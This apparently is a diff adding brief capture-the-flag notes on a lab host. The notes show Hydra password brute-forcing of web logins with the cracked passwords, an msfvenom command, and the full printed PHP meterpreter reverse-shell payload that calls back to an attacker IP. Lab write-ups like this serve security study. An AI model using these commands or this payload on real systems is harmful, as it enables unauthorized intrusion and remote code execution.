@@ -1,0 +1,47 @@
+
+
+fuzzing reveals
+https://10.10.10.43:443/db
+https://10.10.10.43:443/secure_notes
+
+http://10.10.10.43/department
+
+
+we hydra into the db login
+
+hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 50 -V
+
+[443][http-post-form] host: 10.10.10.43   login: none   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-25 22:08:27
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+and for the department login
+
+[80][http-post-form] host: 10.10.10.43   login: none   password: 1q2w3e4r5t
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-25 22:23:09
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=5555 -f raw > ninevehNotes.txt.writeup.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 1112 bytes
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat ninevehNotes.txt.writeup.php 
+/*<?php /**/ error_reporting(0); $ip = '10.10.14.16'; $port = 5555; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();  
+
+
+
+
+
+
+
+
